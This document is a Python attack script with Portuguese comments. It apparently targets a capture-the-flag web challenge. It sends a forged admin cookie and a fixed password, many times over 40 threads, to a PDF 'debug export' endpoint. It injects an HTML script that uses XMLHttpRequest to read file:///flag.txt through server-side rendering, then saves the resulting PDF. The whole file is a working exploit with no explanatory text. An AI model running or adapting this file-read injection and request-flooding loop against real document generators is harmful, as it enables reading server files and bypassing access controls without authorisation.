import requests
import sys
from concurrent.futures import ThreadPoolExecutor

# Configurações do Alvo
TARGET_URL = "http://94.237.56.175:48188/document/debug/export"
COOKIE = "user=eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjJ9-860eeb5d8b51491a1a0bf5b765c865c2cbe58604ec3744a1dafb6b05d641b6ef"
FIXED_PASSWORD = "1234"
THREADS = 40

# Payload de SSRF para ler a flag
PAYLOAD_CONTENT = """
<script>
 xhr = new XMLHttpRequest;
 xhr.onload=function(){document.write((this.responseText))};
 xhr.open("GET","file:///flag.txt");
 xhr.send();
</script>
"""

# Variável de controle para parar as threads quando a flag for encontrada
found = False

def attempt(id):
    global found
    if found:
        return

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0",
        "Cookie": COOKIE,
        "Content-Type": "application/x-www-form-urlencoded"
    }

    data = {
        "access_pass": FIXED_PASSWORD,
        "content": PAYLOAD_CONTENT
    }

    try:
        response = requests.post(TARGET_URL, headers=headers, data=data, timeout=15)

        if response.status_code != 403:
            found = True
            print(f"\n\n[+] SUCESSO! A senha '{FIXED_PASSWORD}' coincidiu.")
            with open("flag_found.pdf", "wb") as f:
                f.write(response.content)
            print("[*] Arquivo 'flag_found.pdf' gerado com sucesso.")
            return True
        
        return False

    except Exception:
        return False

def start_attack():
    print(f"[*] Iniciando ataque multi-thread ({THREADS} threads)...")
    print(f"[*] Alvo: {TARGET_URL}")
    print(f"[*] Tentando senha fixa: {FIXED_PASSWORD}")

    total_attempts = 0
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        while not found:
            # Cria um lote de tarefas para as threads
            futures = [executor.submit(attempt, i) for i in range(THREADS)]
            
            for future in futures:
                total_attempts += 1
                if future.result():
                    break
            
            # Feedback visual de progresso
            sys.stdout.write(f"\rTentativas totais: {total_attempts}...")
            sys.stdout.flush()

if __name__ == "__main__":
    try:
        start_attack()
    except KeyboardInterrupt:
        print("\n[!] Encerrando script...")
        found = True
        sys.exit()
